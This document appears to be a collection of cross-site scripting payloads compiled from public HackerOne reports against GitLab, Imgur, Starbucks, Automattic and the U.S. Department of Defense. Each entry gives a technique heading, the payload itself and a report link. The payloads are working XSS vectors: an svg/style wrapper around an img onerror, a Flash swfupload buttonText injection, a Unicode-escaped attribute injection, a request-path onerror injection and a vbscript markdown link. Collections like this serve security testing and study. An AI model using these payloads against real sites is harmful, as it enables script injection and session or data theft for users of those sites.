## XSS using <svg><style> wrapper to break out <img onerror> payload

### `708c800d`

```
<svg><style><img/src="0"onerror="alert(0)"></style></svg>
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## XSS via SWF buttonText parameter containing javascript: URI

### `03ec8bae`

```
<iframe src="about:blank" id="x"></iframe>

<script>u='https://target.com/include/flash/swfupload.swf?buttonDisabled=&buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME%3C/a%3E&buttonImageURL=/&buttonTextStyle=a{color:%23ff00ff}&buttonAction=-120&buttonCursor=-2';
setInterval(function(){document.getElementById('x').contentWindow.location=u},300)</script>
```

**Parameter:** `buttonText`
— [Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event](https://hackerone.com/reports/91421) · Imgur · [fransrosen](https://hackerone.com/fransrosen)


## XSS via Unicode‑escaped attribute injection in the query string

### `d7dce9b3`

```
https://target.com/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain
```

— [XSS on https://target.com (can lead to credit card theft) (/shop/paymentmethod)](https://hackerone.com/reports/227486) · Starbucks · [bayotop](https://hackerone.com/bayotop)


## XSS via unsanitized 'scripts' parameter inserted into a <script src='...'> tag

### `926658ce`

```
<script src='$Value'>
```

**Parameter:** `scripts`
— [Reflected XSS on a Atavist theme at external_import.php](https://hackerone.com/reports/976657) · Automattic · [bugra](https://hackerone.com/bugra)


## XSS via URL path injection with onerror attribute in HTTP request line

### `ae736b03`

```
GET /login.php/styles<isindex%20type=image%20src=1%20onerror=chor4o(9939)>/"><BODY%20ONLOAD=alert(0x000123)>/local.css HTTP/1.1
```

**Parameter:** `path`
— [Xss  Parameter: /<s>/\[*\]/<s>.css ████████](https://hackerone.com/reports/2353131) · U.S. Dept Of Defense · [chor4o](https://hackerone.com/chor4o)


## XSS via vbscript: URI scheme in a markdown link, executing alert(document.domain) in IE

### `65437ea7`

```
[clickme](vbscript:alert(document.domain))
```

— [Markdown based stored XSS (IE only)](https://hackerone.com/reports/118024) · GitLab · [a0xnirudh](https://hackerone.com/a0xnirudh)
